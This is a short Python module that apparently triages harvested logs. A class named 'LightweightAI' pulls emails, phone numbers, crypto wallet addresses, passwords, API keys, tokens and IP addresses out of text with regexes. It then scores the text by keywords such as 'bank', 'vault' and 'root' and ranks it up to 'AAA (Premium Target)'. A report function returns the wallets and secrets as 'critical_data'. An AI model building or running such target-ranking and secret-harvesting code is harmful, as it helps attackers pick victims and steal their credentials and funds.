import re
import logging
from typing import Dict, List, Any

logger = logging.getLogger(__name__)

class LightweightAI:
    def __init__(self):
        self.patterns = {
            "emails": r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            "phones": r'\+?\d{10,15}',
            "crypto_wallets": r'(?:0x[a-fA-F0-9]{40}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})',
            "sensitive_keys": r'(?i)(password|secret|api_key|token|access_id)\s*[:=]\s*["\']?([a-zA-Z0-9_\-\.]+)',
            "ip_addresses": r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
        }
        self.priority_keywords = {
            "high": ["finance", "crypto", "admin", "root", "vault", "bank", "corporate"],
            "medium": ["work", "login", "cloud", "dev", "manager"],
            "low": ["personal", "games", "social", "media"]
        }

    def analyze_text(self, text: str) -> Dict[str, List[str]]:
        results = {}
        try:
            for label, pattern in self.patterns.items():
                matches = re.findall(pattern, text)
                if matches:
                    results[label] = list(set(matches))
            return results
        except Exception as e:
            logger.error(f"analyze_text failed: {e}")
            return {}

    def classify_target(self, logs: str) -> Dict[str, Any]:
        score = 0
        detected_keywords = []
        lower_logs = logs.lower()
        for level, keywords in self.priority_keywords.items():
            for word in keywords:
                if word in lower_logs:
                    detected_keywords.append(word)
                    if level == "high":
                        score += 10
                    elif level == "medium":
                        score += 5
                    else:
                        score += 1
        if score > 30:
            rank = "AAA (Premium Target)"
        elif score > 15:
            rank = "A (Valuable)"
        elif score > 5:
            rank = "B (Standard)"
        else:
            rank = "C (Basic)"
        return {
            "score": score,
            "rank": rank,
            "interest_points": list(set(detected_keywords))
        }

    def smart_filter(self, data_list: List[str]) -> List[str]:
        return sorted(list(set(data_list)))

    def generate_brief_report(self, raw_data: str) -> Dict[str, Any]:
        extracted = self.analyze_text(raw_data)
        classification = self.classify_target(raw_data)
        return {
            "classification": classification,
            "found_entities": {k: len(v) for k, v in extracted.items()},
            "critical_data": extracted.get("crypto_wallets", []) + extracted.get("sensitive_keys", [])
        }
